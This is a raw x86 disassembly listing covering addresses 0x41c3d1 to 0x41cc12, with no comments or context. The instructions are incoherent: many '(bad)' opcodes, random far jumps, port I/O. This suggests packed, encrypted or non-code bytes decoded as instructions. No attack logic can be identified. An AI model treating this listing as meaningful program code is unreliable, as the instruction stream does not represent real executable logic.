  41c3d1:	loop   0x41c387
  41c3d3:	cmc    
  41c3d4:	repnz into 
  41c3d6:	mov    ah,0xc6
  41c3d8:	sti    
  41c3d9:	in     al,dx
  41c3da:	int3   
  41c3db:	add    ch,bh
  41c3dd:	loopne 0x41c39c
  41c3df:	aam    0xc6
  41c3e1:	cmc    
  41c3e2:	loopne 0x41c3a7
  41c3e4:	ret    0xfd0
  41c3e7:	std    
  41c3e8:	or     eax,0xdeda0ef9
  41c3ed:	xlat   BYTE PTR ds:[ebx]
  41c3ee:	test   esi,0xf5c2eee7
  41c3f4:	fld    st(0)
  41c3f6:	retf   
  41c3f7:	call   0xb92bb1b0
  41c3fc:	fcomi  st,st(3)
  41c3fe:	xlat   BYTE PTR ds:[ebx]
  41c3ff:	fcmovnu st,st(1)
  41c401:	mov    ebp,0xd9f109fd
  41c406:	(bad)  
  41c408:	clc    
  41c409:	(bad)  
  41c40a:	fimul  DWORD PTR ds:0xa8f0a9f2
  41c410:	enter  0xb0e0,0xfa
  41c414:	mov    ch,0xf9
  41c416:	mov    ch,0xcb
  41c418:	div    edi
  41c41a:	fcomp  st(5)
  41c41c:	fsubrp st(0),st
  41c41e:	sar    ah,cl
  41c420:	sti    
  41c421:	aad    0xd7
  41c423:	(bad)  
  41c424:	(bad)  
  41c425:	loope  0x41c411
  41c427:	iret   
  41c428:	push   cs
  41c429:	retf   
  41c42a:	clc    
  41c42b:	leave  
  41c42c:	test   eax,0xb6adebad
  41c431:	shr    bh,1
  41c433:	fcmove st,st(3)
  41c435:	scas   al,BYTE PTR es:[edi]
  41c436:	jmp    0xde1091f9
  41c43b:	repz fiadd DWORD PTR [ecx]
  41c43e:	in     eax,dx
  41c43f:	cmc    
  41c440:	add    al,0x1
  41c442:	sar    BYTE PTR [esp+eiz*8-0xb3f2bf6],0xca
  41c44a:	(bad)  
  41c44b:	icebp  
  41c44c:	test   al,0xe0
  41c44e:	mov    al,0xc1
  41c450:	xlat   BYTE PTR ds:[ebx]
  41c451:	ror    bl,cl
  41c453:	lock out dx,eax
  41c455:	jmp    0xfe03:0xefd8b8f2
  41c45c:	fadd   DWORD PTR [ecx]
  41c45e:	in     eax,dx
  41c45f:	std    
  41c460:	(bad)  
  41c461:	add    DWORD PTR [ecx+0x103cbfb],edi
  41c467:	aad    0xfc
  41c469:	repz or eax,0xe0b2c1e3
  41c46f:	lock mov dl,0xf0
  41c472:	test   eax,0xb6cadaf5
  41c477:	ror    bh,cl
  41c479:	in     al,0xb5
  41c47b:	jmp    0xe315a17c
  41c480:	clc    
  41c481:	repz fimul DWORD PTR [edx]
  41c484:	jecxz  0x41c44c
  41c486:	in     eax,0xcb
  41c488:	iret   
  41c489:	jmp    0x41c492
  41c48b:	(bad)  
  41c48d:	ret    
  41c48e:	lods   eax,DWORD PTR ds:[esi]
  41c48f:	jmp    0xb615ac49
  41c494:	xlat   BYTE PTR ds:[ebx]
  41c495:	retf   
  41c496:	repz rcl dl,cl
  41c499:	call   0xd4259e8c
  41c49e:	loope  0x41c4a6
  41c4a0:	shl    edi,1
  41c4a2:	aad    0xc2
  41c4a4:	rol    DWORD PTR ds:0xcde30703,0xee
  41c4ab:	fcmovu st,st(7)
  41c4ad:	test   eax,0xc7b2f7a9
  41c4b2:	in     eax,0xb2
  41c4b4:	shl    bl,1
  41c4b6:	fcomi  st,st(6)
  41c4b8:	fidivr WORD PTR [eax+edi*4-0x2c113c09]
  41c4bf:	shl    dh,cl
  41c4c1:	cli    
  41c4c2:	aad    0xf0
  41c4c4:	or     dh,dh
  41c4c6:	inc    eax
  41c4c8:	retf   0xd307
  41c4cb:	add    eax,0xe6f3c3cb
  41c4d0:	out    dx,al
  41c4d1:	in     al,dx
  41c4d2:	call   0xed0a949b
  41c4d7:	(bad)  
  41c4d8:	enter  0xfff3,0xf2
  41c4dc:	fadd   st,st(2)
  41c4de:	faddp  st(3),st
  41c4e0:	std    
  41c4e1:	icebp  
  41c4e2:	rcr    dl,0xf4
  41c4e5:	add    al,0xb
  41c4e7:	in     eax,0xc8
  41c4e9:	or     al,BYTE PTR [edx]
  41c4eb:	in     al,dx
  41c4ec:	out    dx,eax
  41c4ed:	int3   
  41c4ee:	iret   
  41c4ef:	test   al,0xf5
  41c4f1:	mov    dh,0xb1
  41c4f3:	(bad)  
  41c4f4:	mov    bh,0xb5
  41c4f6:	jmp    0xe0409bc3
  41c4fb:	cld    
  41c4fc:	rol    ecx,cl
  41c4fe:	fidivr WORD PTR [ebp-0x2d2f2913]
  41c504:	ret    
  41c505:	clc    
  41c506:	jmp    0xdee3:0x90adc06
  41c50d:	mov    esp,0xb1e4ccd2
  41c512:	mov    cl,0xca
  41c514:	jmp    0x41c4c7
  41c516:	enter  0xc9b4,0xf7
  41c51a:	enter  0xe1d5,0xfb
  41c51e:	(bad)  [ebp+eax*8-0x14160a26]
  41c525:	leave  
  41c526:	push   cs
  41c527:	cli    
  41c528:	leave  
  41c529:	or     cl,bh
  41c52b:	jecxz  0x41c512
  41c52d:	mov    edi,0xaac9a8c2
  41c532:	loop   0x41c4e9
  41c534:	sti    
  41c535:	fcmove st,st(1)
  41c537:	jmp    0x41c516
  41c539:	(bad)  
  41c53b:	(bad)  
  41c53d:	enter  0xbcf6,0xec
  41c541:	int3   
  41c542:	mov    BYTE PTR [edi],0xf8
  41c545:	loope  0x41c526
  41c547:	add    DWORD PTR [ecx],eax
  41c549:	fild   DWORD PTR [edi]
  41c54b:	add    al,0xce
  41c54d:	sar    BYTE PTR [esi-0x4c48114f],0xc2
  41c554:	aam    0xfb
  41c556:	jmp    0xb9d6:0xccbbf2fe
  41c55d:	lock mov eax,0xddf9edda
  41c563:	aad    0xdf
  41c565:	out    0x1,al
  41c567:	jmp    0xfa03bf53
  41c56c:	mov    edi,0xe3e6e4f0
  41c571:	retf   0xb4f2
  41c574:	int3   
  41c575:	cli    
  41c576:	lods   eax,DWORD PTR ds:[esi]
  41c577:	sti    
  41c578:	iret   
  41c579:	hlt    
  41c57a:	loop   0x41c52c
  41c57c:	fild   DWORD PTR [ebx]
  41c57e:	shl    ebp,0xdc
  41c581:	(bad)  
  41c582:	mov    ecx,0xc9e008d7
  41c587:	add    ch,al
  41c589:	loope  0x41c553
  41c58b:	clc    
  41c58c:	out    0xd2,al
  41c58e:	out    0xe5,eax
  41c590:	mov    cl,0xc8
  41c592:	repnz mov bh,0xe9
  41c595:	iret   
  41c596:	mov    dh,0xac
  41c598:	repnz mov edi,0xc3f0ddd1
  41c59e:	loope  0x41c573
  41c5a0:	(bad)  
  41c5a1:	icebp  
  41c5a2:	lds    eax,FWORD PTR [edx]
  41c5a4:	add    eax,0xf9e30adb
  41c5a9:	fisttp DWORD PTR ds:0xf0c3efe5
  41c5af:	jecxz  0x41c5a1
  41c5b1:	stos   BYTE PTR es:[edi],al
  41c5b2:	shl    ch,1
  41c5b4:	mov    ecx,0xbdf2d4db
  41c5b9:	mov    ebx,0xf9d9d3b4
  41c5be:	mov    ecx,0xd6fdd5c1
  41c5c3:	std    
  41c5c4:	out    0x0,al
  41c5c6:	cli    
  41c5c7:	rol    BYTE PTR [edx],0xe6
  41c5ca:	jmp    0xc625abc1
  41c5cf:	imul   DWORD PTR [ebx-0x14262540]
  41c5d5:	mov    ah,0xf3
  41c5d7:	repz mov esi,0xf8fcb8bf
  41c5dd:	add    eax,ebx
  41c5df:	repz sar esi,cl
  41c5e2:	rcr    ebp,1
  41c5e4:	ror    DWORD PTR [ecx],1
  41c5e6:	jmp    0xf927a0b9
  41c5eb:	adc    al,dl
  41c5ed:	in     al,dx
  41c5ee:	fisubr WORD PTR [edi-0x3e0d1431]
  41c5f4:	mov    edx,0xf1d9b0ee
  41c5f9:	iret   
  41c5fa:	retf   
  41c5fb:	leave  
  41c5fc:	mov    ebx,0xbe05fcc0
  41c601:	add    eax,0xf4e1f6c3
  41c606:	(bad)  [ebx]
  41c608:	fxch   st(5)
  41c60a:	in     al,dx
  41c60b:	out    dx,eax
  41c60c:	(bad)  
  41c60e:	lods   al,BYTE PTR ds:[esi]
  41c60f:	xlat   BYTE PTR ds:[ebx]
  41c610:	vpmullw ymm1,ymm1,ymm6
  41c614:	in     eax,dx
  41c615:	rcl    eax,cl
  41c617:	retf   
  41c618:	stc    
  41c619:	idiv   DWORD PTR [ecx-0x7314442]
  41c61f:	in     al,dx
  41c620:	in     eax,0xba
  41c622:	loope  0x41c600
  41c624:	loope  0x41c627
  41c626:	(bad)
  41c629:	in     al,dx
  41c62a:	push   cs
  41c62b:	ffree  st(3)
  41c62d:	shl    BYTE PTR [eax-0x3c431a0d],cl
  41c633:	retf   0xc0f2
  41c636:	leave  
  41c637:	lods   al,BYTE PTR ds:[esi]
  41c638:	mov    esi,0xf5e1fcb9
  41c63d:	(bad)  
  41c63e:	fucomip st,st(5)
  41c640:	in     al,dx
  41c641:	mov    edx,0xd903f202
  41c646:	out    0xf8,al
  41c648:	call   0xba24d94b
  41c64d:	mov    esi,0xcfcebdde
  41c652:	lods   al,BYTE PTR ds:[esi]
  41c653:	call   0xb136940a
  41c658:	mov    edi,0xddf7f2d4
  41c65d:	pop    es
  41c65e:	jecxz  0x41c641
  41c660:	(bad)  
  41c661:	loop   0x41c63f
  41c663:	add    dh,al
  41c665:	loop   0x41c661
  41c667:	jmp    0x41c671
  41c669:	(bad)  
  41c66a:	stc    
  41c66b:	or     al,bl
  41c66d:	mov    esi,0xd4e5c4c9
  41c672:	jecxz  0x41c639
  41c674:	loope  0x41c66b
  41c676:	dec    ecx
  41c678:	(bad)
  41c67b:	mov    eax,0xe7dcf9bc
  41c680:	add    ch,bl
  41c682:	lock (bad) 
  41c685:	add    ah,dl
  41c687:	add    eax,0xd90edae9
  41c68c:	call   0xee10733a
  41c691:	in     al,dx
  41c692:	mov    bh,0xd6
  41c694:	in     al,dx
  41c695:	retf   0xcdd0
  41c698:	call   0xde3db57b
  41c69d:	in     al,dx
  41c69e:	sar    esp,cl
  41c6a0:	ffreep st(2)
  41c6a2:	lock lock loop 0x41c670
  41c6a6:	(bad)  
  41c6a8:	loope  0x41c683
  41c6aa:	or     BYTE PTR [edx],cl
  41c6ac:	stos   DWORD PTR es:[edi],eax
  41c6ad:	(bad)  [eax-0x16182f3a]
  41c6b3:	out    dx,al
  41c6b4:	in     eax,dx
  41c6b5:	sti    
  41c6b6:	retf   
  41c6b7:	mov    ch,0xf5
  41c6b9:	fnstsw WORD PTR [ebp-0xb050c25]
  41c6bf:	loopne 0x41c69a
  41c6c1:	fidivr DWORD PTR [ecx-0x341bf909]
  41c6c7:	add    eax,0xff04f8f4
  41c6cc:	shl    DWORD PTR [ecx-0xe3c2136],0xf7
  41c6d3:	enter  0xf0cd,0xdf
  41c6d7:	jmp    0x41c698
  41c6d9:	mov    edi,0xe1fae1e3
  41c6de:	loopne 0x41c6d9
  41c6e0:	repnz fadd DWORD PTR [ebx]
  41c6e3:	(bad)  
  41c6e5:	or     ebx,edi
  41c6e7:	cld    
  41c6e8:	fcom   st(4)
  41c6ea:	adc    dh,bl
  41c6ec:	jecxz  0x41c6b5
  41c6ee:	test   eax,0xedf2d0e9
  41c6f3:	mov    dh,0xcf
  41c6f5:	lock repz idiv BYTE PTR [ebx-0x40011721]
  41c6fd:	mov    edi,0xf1feeee7
  41c702:	or     dh,cl
  41c704:	ret    0xebff
  41c707:	retf   
  41c708:	into   
  41c709:	fsubr  st(4),st
  41c70b:	into   
  41c70c:	jecxz  0x41c6de
  41c70e:	iret   
  41c70f:	scas   al,BYTE PTR es:[edi]
  41c710:	mov    al,0xb3
  41c712:	fcmove st,st(1)
  41c714:	sar    ebx,1
  41c716:	mov    ecx,0xd9f0f8fb
  41c71b:	(bad)  
  41c71c:	enter  0xcc07,0xbf
  41c720:	in     eax,0xe0
  41c722:	jmp    0x41c6e7
  41c724:	cmc    
  41c725:	ret    0xc7df
  41c728:	(bad)  
  41c729:	hlt    
  41c72a:	push   es
  41c72b:	fadd   st(1),st
  41c72d:	mov    dl,0xf2
  41c72f:	mov    ebp,0xf1d3d2d2
  41c734:	mov    edx,0xe4acc5ba
  41c739:	xlat   BYTE PTR ds:[ebx]
  41c73a:	shl    BYTE PTR [ebp+edx*8-0x1c210d31],cl
  41c741:	add    ch,dl
  41c743:	fcmovbe st,st(5)
  41c745:	(bad)  
  41c746:	push   cs
  41c747:	add    al,0xfa
  41c749:	int    0xd
  41c74b:	fisubr WORD PTR [eax+edi*4-0x29283831]
  41c752:	in     eax,0xb0
  41c754:	mov    ebx,0xf1c5b0ef
  41c759:	fidiv  DWORD PTR [ecx-0x2e232c10]
  41c75f:	repz int3 
  41c761:	or     ecx,DWORD PTR [edx]
  41c763:	fadd   st(2),st
  41c765:	aam    0xdb
  41c767:	aad    0xfe
  41c769:	iret   
  41c76a:	ror    ebp,0xef
  41c76d:	rol    bh,1
  41c76f:	in     eax,0xea
  41c771:	(bad)  [ecx+ebx*8-0x1a123f2c]
  41c778:	repnz leave 
  41c77a:	(bad)  
  41c77b:	out    dx,eax
  41c77c:	fsubrp st(0),st
  41c77e:	into   
  41c77f:	in     eax,0xf7
  41c781:	add    al,0xe7
  41c783:	pop    es
  41c784:	stc    
  41c785:	fcmovnu st,st(3)
  41c787:	jmp    0xf4cb598
  41c78c:	scas   eax,DWORD PTR es:[edi]
  41c78d:	(bad)  
  41c78e:	shl    dh,cl
  41c790:	(bad)  
  41c791:	jecxz  0x41c781
  41c793:	(bad)  
  41c795:	(bad)  
  41c797:	mov    ah,0xcc
  41c799:	call   0xdafe9053
  41c79e:	out    dx,al
  41c79f:	aam    0xf0
  41c7a1:	(bad)  
  41c7a2:	loope  0x41c760
  41c7a4:	in     eax,0xe0
  41c7a6:	fcmovne st,st(6)
  41c7a8:	fimul  DWORD PTR [ebx]
  41c7aa:	jmp    0xf01499bd
  41c7af:	ret    
  41c7b0:	out    0xaa,eax
  41c7b2:	int    0xe4
  41c7b4:	repz mov al,0xc6
  41c7b7:	(bad)  
  41c7b9:	mov    ebp,0x7ceb4b8
  41c7be:	add    edi,edi
  41c7c0:	add    eax,0x4fed5fe
  41c7c5:	test   DWORD PTR [edx],0xefdc02c8
  41c7cb:	int3   
  41c7cc:	out    0xbe,eax
  41c7ce:	jecxz  0x41c7b5
  41c7d0:	ret    0xaceb
  41c7d3:	loope  0x41c7c5
  41c7d5:	in     eax,0xf9
  41c7d7:	call   0x41fc7aa
  41c7dc:	jecxz  0x41c7d1
  41c7de:	out    0xdd,al
  41c7e0:	int    0xc3
  41c7e2:	(bad)  
  41c7e3:	inc    DWORD PTR [ecx]
  41c7e5:	jmp    0x41c7e9
  41c7e7:	or     eax,0xe809e4ce
  41c7ec:	shl    esp,1
  41c7ee:	(bad)  
  41c7ef:	out    dx,al
  41c7f0:	jmp    0xc712b4a5
  41c7f5:	in     al,dx
  41c7f6:	mov    ebx,0xcbd2bfed
  41c7fb:	aad    0xf9
  41c7fd:	fst    st(7)
  41c7ff:	add    ebp,eax
  41c801:	(bad)  
  41c802:	out    0xf2,al
  41c804:	les    ecx,FWORD PTR [edx]
  41c806:	sti    
  41c807:	out    dx,al
  41c808:	(bad)  
  41c809:	hlt    
  41c80a:	(bad)
  41c80d:	fmul   st,st(7)
  41c80f:	mov    al,0xe3
  41c812:	mov    cl,0xf2
  41c814:	in     eax,0xd1
  41c816:	(bad)
  41c819:	cmc    
  41c81a:	fdivr  st,st(7)
  41c81c:	ret    0x3e1
  41c81f:	mov    eax,0xf6c2c5d5
  41c824:	jmp    0xf305:0xd40edcc6
  41c82b:	fldcw  WORD PTR [ecx-0x17524258]
  41c831:	ror    edx,1
  41c833:	call   0xd5079d21
  41c838:	(bad)  
  41c839:	mov    edi,0xfa03f2f1
  41c83e:	int3   
  41c83f:	fadd   st,st(5)
  41c841:	ret    0xe601
  41c844:	add    ebp,edi
  41c846:	(bad)  
  41c847:	enter  0xfdfe,0x2
  41c84b:	call   0xd602b03e
  41c850:	shl    bh,1
  41c852:	jmp    0x41c82e
  41c854:	(bad)  
  41c855:	out    0xb8,eax
  41c857:	in     eax,dx
  41c858:	fdivr  DWORD PTR [eax+edi*8-0x3f002d09]
  41c85f:	mov    eax,0xfa06d4be
  41c864:	hlt    
  41c865:	add    cl,bh
  41c867:	fcmovnu st,st(2)
  41c869:	sti    
  41c86a:	stc    
  41c86b:	push   es
  41c86c:	mov    esi,0xdccfe9b0
  41c871:	jecxz  0x41c85c
  41c873:	mov    ch,0xf4
  41c875:	jmp    0xf3f0:0xf7cff1d4
  41c87c:	sar    DWORD PTR [eax+0x5befbe1],cl
  41c882:	rol    DWORD PTR [edi],cl
  41c884:	or     esp,eax
  41c886:	leave  
  41c887:	add    ebx,ebp
  41c889:	add    bl,dl
  41c88b:	clc    
  41c88c:	fnsave [ecx-0x3b294c1c]
  41c892:	mov    ah,0xda
  41c894:	rcl    al,0xea
  41c897:	(bad)  
  41c898:	mov    ah,0xbc
  41c89a:	retf   
  41c89b:	xlat   BYTE PTR ds:[ebx]
  41c89c:	repz shr ebp,cl
  41c89f:	hlt    
  41c8a0:	rcr    cl,cl
  41c8a2:	rcr    esp,0xe7
  41c8a5:	loop   0x41c8a8
  41c8a7:	(bad)
  41c8aa:	out    0xc,eax
  41c8ac:	int3   
  41c8ad:	mov    bh,0xc5
  41c8b0:	scas   al,BYTE PTR es:[edi]
  41c8b1:	into   
  41c8b2:	mov    ah,0xd0
  41c8b4:	mov    esp,0xd6eeede6
  41c8ba:	shl    DWORD PTR [eax-0x2a0a0727],1
  41c8c0:	mov    esi,0xc3fbd1dd
  41c8c5:	mov    BYTE PTR [edx],0xdc
  41c8c8:	(bad)  
  41c8c9:	jecxz  0x41c88f
  41c8cb:	jmp    0x41c893
  41c8cd:	iret   
  41c8ce:	mov    al,0xd0
  41c8d0:	int    0xe6
  41c8d2:	idiv   cl
  41c8d4:	aam    0xc9
  41c8d6:	(bad)  
  41c8d7:	fidiv  WORD PTR [ebx-0x22301121]
  41c8dd:	(bad)  
  41c8df:	repnz int3 
  41c8e1:	fadd   DWORD PTR [esi]
  41c8e3:	loope  0x41c8d9
  41c8e5:	retf   
  41c8e6:	out    0xe2,al
  41c8e8:	sti    
  41c8e9:	loop   0x41c8ac
  41c8eb:	cli    
  41c8ec:	in     eax,dx
  41c8ed:	lock out 0xc1,eax
  41c8f0:	ret    0xcac5
  41c8f3:	enter  0xb5eb,0xff
  41c8f7:	enter  0xbbf1,0xb4
  41c8fb:	mov    ebp,0xd2b5c8cd
  41c900:	fsub   st,st(6)
  41c902:	jmp    0xebf8:0xe1f5dad1
  41c909:	out    0xc4,al
  41c90b:	shl    cl,cl
  41c90d:	call   0xe41e9ef5
  41c912:	(bad)  
  41c913:	aad    0xd6
  41c915:	out    dx,eax
  41c916:	fdiv   st,st(4)
  41c918:	icebp  
  41c919:	div    DWORD PTR [edi+ebx*8-0x40333c20]
  41c920:	sti    
  41c921:	fadd   QWORD PTR [ecx]
  41c923:	cli    
  41c924:	call   0xc7419307
  41c929:	leave  
  41c92a:	or     BYTE PTR ds:0xbee6c4c8,al
  41c930:	hlt    
  41c931:	(bad)  [ebp-0x26484e30]
  41c937:	sti    
  41c938:	cmc    
  41c939:	add    esi,DWORD PTR [edi+ebx*8-0x8032448]
  41c940:	mov    ebx,0xfedefcd5
  41c945:	(bad)  
  41c946:	retf   
  41c947:	shr    bl,0xc
  41c94a:	add    esp,esi
  41c94c:	mov    ebp,0xccf6f0f0
  41c951:	hlt    
  41c952:	loope  0x41c92e
  41c954:	fidivr DWORD PTR [ecx-0x494a3708]
  41c95a:	sti    
  41c95b:	ret    0xd0d0
  41c95e:	add    dl,al
  41c960:	in     eax,dx
  41c961:	out    0x0,al
  41c963:	add    esi,ecx
  41c965:	paddb  mm5,mm7
  41c968:	sti    
  41c969:	int    0xfa
  41c96b:	jmp    FWORD PTR [esi-0x482e094e]
  41c971:	jmp    0x41c925
  41c973:	cli    
  41c974:	icebp  
  41c975:	lock int3 
  41c977:	enter  0xf3f6,0xd9
  41c97b:	ret    0xe2f5
  41c97e:	out    dx,al
  41c97f:	(bad)  
  41c981:	lock (bad) 
  41c983:	in     al,0xc7
  41c985:	mov    esi,0xcbe1e4ff
  41c98a:	cld    
  41c98b:	or     dh,cl
  41c98d:	mov    edi,0xeff7b1ae
  41c992:	loope  0x41c959
  41c994:	cmc    
  41c995:	cmc    
  41c996:	xlat   BYTE PTR ds:[ebx]
  41c997:	lds    esi,FWORD PTR [ebp-0x26310f45]
  41c99d:	shl    dh,1
  41c99f:	mov    esp,0xc3d004d5
  41c9a4:	or     bh,dl
  41c9a6:	stc    
  41c9a7:	enter  0xfffc,0xc
  41c9ab:	clc    
  41c9ac:	stos   BYTE PTR es:[edi],al
  41c9ad:	ret    
  41c9ae:	div    DWORD PTR [edx-0x57534f1a]
  41c9b4:	jmp    0xdeec:0xcab8f1b8
  41c9bb:	(bad)  
  41c9bc:	jmp    0x3ffcd8e
  41c9c1:	(bad)  
  41c9c2:	(bad)  
  41c9c4:	jmp    0xd9fa:0xed0bf5f6
  41c9cb:	or     ch,BYTE PTR [edi-0x4d121236]
  41c9d1:	out    0xcb,al
  41c9d3:	cli    
  41c9d4:	aam    0xe7
  41c9d6:	fprem1 
  41c9d8:	fmul   st,st(6)
  41c9da:	fmul   st(7),st
  41c9dc:	std    
  41c9dd:	add    esi,edx
  41c9df:	rcl    eax,cl
  41c9e1:	div    ebp
  41c9e3:	hlt    
  41c9e4:	lock add eax,0x3e6d400
  41c9ea:	add    eax,DWORD PTR [ebx]
  41c9ec:	int3   
  41c9ed:	loope  0x41c9dd
  41c9ef:	fucom  st(6)
  41c9f1:	(bad)  
  41c9f2:	out    0xe6,eax
  41c9f4:	cmc    
  41c9f5:	out    0xeb,al
  41c9f7:	cli    
  41c9f8:	xlat   BYTE PTR ds:[ebx]
  41c9f9:	fldl2e 
  41c9fb:	mov    esp,0xbfdab8c9
  41ca00:	fsub   st,st(5)
  41ca02:	ret    
  41ca03:	cld    
  41ca04:	cli    
  41ca05:	loop   0x41ca01
  41ca07:	jmp    0xd8ec:0xccdaffc7
  41ca0e:	mov    dl,0xbd
  41ca10:	stos   DWORD PTR es:[edi],eax
  41ca11:	(bad)
  41ca14:	les    edi,FWORD PTR [ecx-0x4205073b]
  41ca1a:	retf   0xdcf9
  41ca1d:	cld    
  41ca1e:	(bad)  
  41ca1f:	jmp    edi
  41ca21:	fstp   TBYTE PTR [ecx-0x4352836]
  41ca27:	dec    BYTE PTR [edx]
  41ca29:	retf   
  41ca2a:	enter  0xd908,0xe1
  41ca2e:	mov    edi,0xb7b4d7e8
  41ca33:	repz mov ebx,0xf5edd7ae
  41ca39:	fcmovnbe st,st(2)
  41ca3b:	fcmovnbe st,st(1)
  41ca3d:	add    bl,al
  41ca3f:	int3   
  41ca40:	std    
  41ca41:	in     eax,0xc2
  41ca43:	clc    
  41ca44:	clc    
  41ca45:	retf   0x2c4
  41ca48:	int    0xd4
  41ca4a:	clc    
  41ca4b:	add    ch,ah
  41ca4d:	jmp    0x41ca22
  41ca4f:	(bad)  
  41ca50:	mov    bh,0xd1
  41ca52:	loop   0x41ca43
  41ca54:	iret   
  41ca55:	stc    
  41ca56:	stc    
  41ca57:	rcr    edx,1
  41ca59:	mov    ch,0xf7
  41ca5b:	rol    DWORD PTR [ecx],1
  41ca5d:	shl    ebx,1
  41ca5f:	out    0xdb,eax
  41ca61:	shl    ebx,cl
  41ca63:	(bad)  
  41ca64:	or     ah,al
  41ca66:	cmc    
  41ca67:	(bad)  
  41ca68:	jmp    0xedf7:0xdeeaeee0
  41ca6f:	(bad)
  41ca73:	in     al,dx
  41ca74:	in     al,dx
  41ca75:	enter  0xb0c8,0xde
  41ca79:	add    ebx,esi
  41ca7b:	fstp   st(1)
  41ca7d:	pop    es
  41ca7e:	(bad)  
  41ca80:	vpmullw xmm7,xmm4,XMMWORD PTR [eax-0x15f00424]
  41ca88:	add    ecx,DWORD PTR [esi]
  41ca8a:	iret   
  41ca8b:	or     BYTE PTR [edx-0x173d563b],dh
  41ca91:	in     eax,dx
  41ca92:	into   
  41ca93:	aad    0xfb
  41ca95:	sar    DWORD PTR [edi-0x2d3b0a12],1
  41ca9b:	call   0xee128790
  41caa0:	aam    0xe3
  41caa2:	repnz mov esp,0xc5e00fd7
  41caa8:	or     al,0xf8
  41caaa:	std    
  41caab:	out    0xcc,eax
  41caad:	int3   
  41caae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caaf:	leave  
  41cab0:	in     eax,dx
  41cab1:	mov    ch,0xe0
  41cab3:	out    dx,eax
  41cab4:	(bad)  
  41cab5:	(bad)  
  41cab7:	repnz div eax
  41caba:	lock mov esi,0xdaefeeb7
  41cac0:	add    eax,0xe2bcf7f6
  41cac5:	inc    DWORD PTR [edx]
  41cac7:	inc    BYTE PTR [esi]
  41cac9:	fild   DWORD PTR ds:0xf2c7c9fa
  41cacf:	out    0xd0,al
  41cad1:	lock leave 
  41cad3:	cmc    
  41cad4:	mov    ecx,0xcbfdf6ba
  41cad9:	mov    esp,0xb8eec9bd
  41cade:	cld    
  41cadf:	mov    esp,0xf8e4d9cc
  41cae4:	jmp    0xa0cb0cd
  41cae9:	add    eax,0xe0d8cade
  41caee:	lock iret 
  41caf0:	shr    ebp,cl
  41caf2:	in     eax,dx
  41caf3:	hlt    
  41caf4:	jmp    0xbedc:0xcab9e6f1
  41cafb:	call   0xf423b8ef
  41cb00:	ret    
  41cb01:	add    al,0xbd
  41cb03:	add    esi,esp
  41cb05:	fst    st(4)
  41cb07:	(bad)  
  41cb0a:	in     al,dx
  41cb0b:	jecxz  0x41cab9
  41cb0d:	jmp    0x41cae0
  41cb0f:	aad    0xce
  41cb11:	lods   al,BYTE PTR ds:[esi]
  41cb12:	in     eax,dx
  41cb13:	call   0xbb2da1d3
  41cb18:	std    
  41cb19:	aad    0xcd
  41cb1b:	dec    esi
  41cb1d:	mul    ebx
  41cb1f:	mov    esp,0xad1def5
  41cb24:	cld    
  41cb25:	clc    
  41cb26:	test   bl,0x0
  41cb29:	in     eax,dx
  41cb2a:	clc    
  41cb2b:	(bad)  
  41cb2d:	retf   
  41cb2e:	(bad)  
  41cb2f:	mov    dh,0xb5
  41cb31:	(bad)
  41cb34:	mov    ecx,0xf9d1b1bb
  41cb39:	rcl    edi,cl
  41cb3b:	rol    DWORD PTR [ecx],1
  41cb3d:	div    cl
  41cb3f:	loope  0x41cb32
  41cb41:	fld    DWORD PTR [eax]
  41cb43:	fidivr DWORD PTR [edi-0x1800fb03]
  41cb49:	cld    
  41cb4a:	or     bh,cl
  41cb4c:	rol    edi,cl
  41cb4e:	mov    bh,0xdc
  41cb50:	repz out dx,al
  41cb52:	out    0xdb,eax
  41cb54:	clc    
  41cb55:	fsubr  st,st(5)
  41cb57:	into   
  41cb58:	sti    
  41cb59:	mov    ecx,0x7cec8da
  41cb5e:	aam    0xe0
  41cb60:	ret    
  41cb61:	add    al,ah
  41cb63:	icebp  
  41cb64:	icebp  
  41cb65:	add    esi,eax
  41cb67:	loope  0x41cb37
  41cb69:	push   cs
  41cb6a:	fild   DWORD PTR [esi]
  41cb6c:	ror    dh,1
  41cb6e:	jmp    0xeeb1:0xefe8f7d0
  41cb75:	mov    dh,0xf0
  41cb77:	stc    
  41cb78:	repz mov edi,0xbcf1d9ea
  41cb7e:	out    0xd4,al
  41cb80:	(bad)  
  41cb82:	fadd   QWORD PTR [edx]
  41cb84:	cld    
  41cb85:	fdivrp st(4),st
  41cb87:	push   es
  41cb88:	aam    0xc
  41cb8a:	(bad)  
  41cb8c:	faddp  st(5),st
  41cb8e:	iret   
  41cb8f:	out    0xc7,al
  41cb91:	retf   
  41cb92:	out    dx,eax
  41cb93:	lods   al,BYTE PTR ds:[esi]
  41cb94:	mov    edx,0xf2f8dbcc
  41cb99:	cld    
  41cb9a:	cmc    
  41cb9b:	cli    
  41cb9c:	mov    ebp,0xf7d4eee8
  41cba1:	out    0xe7,eax
  41cba3:	icebp  
  41cba4:	shl    ecx,1
  41cba6:	(bad)  
  41cba7:	aad    0x8
  41cba9:	add    eax,0xf2d0c8c9
  41cbae:	not    ebx
  41cbb0:	jmp    0x41cb64
  41cbb2:	shl    ch,0xaf
  41cbb5:	mov    edx,0xb5ded4f1
  41cbba:	out    dx,eax
  41cbbb:	idiv   BYTE PTR [ebx-0x1b121c13]
  41cbc1:	add    eax,0xe0e603f0
  41cbc6:	(bad)  
  41cbc7:	fsub   st,st(1)
  41cbc9:	or     esi,ebx
  41cbcb:	shr    bl,0xe6
  41cbce:	scas   al,BYTE PTR es:[edi]
  41cbcf:	(bad)  
  41cbd0:	mov    ebp,0xccd1e2c5
  41cbd5:	mov    dh,0xcc
  41cbd7:	out    dx,eax
  41cbd8:	int    0xfa
  41cbda:	jmp    0xe0c2:0xdfbcddc3
  41cbe1:	les    eax,FWORD PTR [ecx+ecx*1]
  41cbe4:	test   dl,0xe9
  41cbe7:	dec    DWORD PTR [eax]
  41cbe9:	fxch   st(5)
  41cbeb:	clc    
  41cbec:	int3   
  41cbed:	(bad)  
  41cbee:	retf   0xf5b7
  41cbf1:	mov    bl,0xe1
  41cbf3:	mov    ebx,0xcfb6efb4
  41cbf8:	out    dx,eax
  41cbf9:	mov    eax,0xddddd7d9
  41cbfe:	shl    ebp,cl
  41cc00:	rcr    cl,1
  41cc02:	rcl    esp,0xe3
  41cc05:	or     ebp,eax
  41cc07:	or     al,bh
  41cc09:	loope  0x41cbe5
  41cc0b:	add    bh,ah
  41cc0d:	scas   eax,DWORD PTR es:[edi]
  41cc0e:	scas   eax,DWORD PTR es:[edi]
  41cc0f:	mov    cl,0xe8
  41cc11:	ret    
  41cc12:	int3   
